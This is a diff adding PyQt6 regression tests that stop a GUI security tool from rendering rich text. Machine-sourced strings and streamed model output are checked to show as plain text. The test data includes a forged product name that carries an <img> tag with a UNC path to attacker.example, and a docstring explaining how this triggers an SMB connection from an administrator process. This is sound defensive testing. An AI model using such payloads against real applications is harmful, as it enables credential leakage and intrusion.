@@ -173,3 +173,61 @@ def test_the_window_says_who_writes_the_code_that_runs(window, qt_app):
     assert "catalogue" in said.lower()
     assert "lares-freehand" in said
     assert "cannot introduce one" in said
+
+
+# --------------------------------------------------------------------------
+# The window renders what the machine said, and the machine is not trusted
+# --------------------------------------------------------------------------
+
+FORGED = 'Acme Reader <b>SAFE</b> <img src="\\\\attacker.example\\s\\a.png">'
+
+
+def test_no_label_in_the_application_renders_rich_text(qt_app):
+    """QLabel defaults to AutoText, which guesses "HTML" for anything with a
+    tag in it - and nearly everything shown here came off the machine.
+
+    A product name under HKCU, which the logged-in user can write with no UAC
+    prompt, reached a label on the Exposure page. The tags were swallowed, so
+    the operator read "Acme Reader" and never saw the payload; and Qt resolved
+    the image resource, which on Windows opens an SMB session to the
+    attacker's host from a process running as administrator.
+    """
+    from PyQt6.QtCore import Qt
+
+    from lares.gui.widgets import Text
+
+    label = Text(FORGED)
+    assert label.textFormat() == Qt.TextFormat.PlainText
+    assert label.text() == FORGED, "the text is shown in full, just not parsed"
+
+
+def test_a_forged_product_name_reaches_the_page_intact(window, qt_app):
+    """End to end: through the survey, the comparison, and onto the page."""
+    import copy
+
+    from lares.gui.widgets import Text
+    from lares.sense import baseline as baseline_mod
+    from lares.sense import surface as surface_mod
+
+    before = surface_mod.survey()
+    after = copy.deepcopy(before)
+    after.get("software").rows.append(
+        {"name": FORGED, "version": "1.0", "publisher": "x"})
+
+    page = window.page_exposure
+    page._done(after, baseline_mod.compare(before, after))
+    qt_app.processEvents()
+
+    shown = " ".join(w.text() for w in page.changes_body.findChildren(Text))
+    assert "Acme Reader" in shown
+    assert "<img" in shown, "the payload must be visible, not swallowed"
+    for label in page.changes_body.findChildren(Text):
+        assert label.textFormat().name == "PlainText"
+
+
+def test_the_streamed_model_output_is_plain_text_too(window, qt_app):
+    """The same label class carries the model's own reply."""
+    window.voice.asked.emit("rules", "state")
+    window.voice.token.emit('{"summary": "<img src=\\"\\\\\\\\x\\\\y\\">"}')
+    qt_app.processEvents()
+    assert window.page_hearth.think.textFormat().name == "PlainText"
